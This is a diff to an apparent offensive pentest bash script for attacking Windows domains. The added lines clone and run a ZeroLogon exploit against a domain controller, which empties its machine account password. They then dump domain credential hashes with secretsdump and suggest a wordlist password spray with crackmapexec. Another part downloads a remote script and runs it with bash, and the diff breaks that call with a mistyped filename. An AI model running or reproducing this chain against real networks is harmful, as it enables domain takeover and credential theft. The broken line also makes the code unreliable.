@@ -490,12 +490,24 @@ fi
 read -p "Test for Zero Logon? (y/n)" answer
 if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
+	echo -e '\E[31;40m' "If you get an error, and it states it is vulnerable it is ok"; tput sgr0
 	sudo git clone https://github.com/sho-luv/zerologon.git
+	echo -e '\E[32;40m' 'YOU NEED TO PUT THE SMB DOMAIN NAME (EX: ZERO-DC) INTO /ETC/HOSTS'; tput sgr0
+	echo -e '\E[33;40m' "If you do not know it, do a crackmapexec smb $DOMAINIP -u fjsdkaf -p /usr/share/wordlists/fasttrack and the share name will be there"
+	read -p 'Press enter when done with the above' answer
 	echo -e '\E[31;40m' 'SMB Share Name?'; tput sgr0
 	read SHARENAME
 	cd zerologon
-	python3 zerologon.py "$SHARENAME" "$DOMAINIP" -exploit
+	echo -e '\E[31;40m' 'Saving to ../zero.txt'; tput sgr0
+	python3 zerologon.py -exploit "$DOMAINIP" > ../zero.txt
 	cd ..
+	if grep "Target vulnerable, changing account password to empty string" zero.txt
+	then
+		echo -e '\E[31;40m' 'Running Secrets Dump and saving to secretsdump.txt'; tput sgr0
+		secretsdump.py -no-pass -just-dc "$DOMAIN"/"$SHARENAME\$"@$DOMAINIP > secretsdump.txt
+	else
+		echo -e '\E[31;40m' 'Target does not seem vulnerable'
+	fi
 fi
 
 read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
@@ -583,7 +595,7 @@ read -p "Do you want to run SMB Killer (this is a script that makes .url, .scf, 
 if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Downloading newest version from github";tput sgr0
 	wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.sh
-	bash SMB_Killer.sh
+	bash SMB_Killer.share
 else
 	echo -e '\E[31;40m' "Not running SMB Killer";tput sgr0
 fi
@@ -599,4 +611,3 @@ fi
 
 # if you actually read this, then good job, if you just ran it... shame on you, know what something is doing before you do anything, good thing
 # nothing malicious is happening to your own system!!! READ THE DAMN SCRIPTS ON GITHUB!!!
-
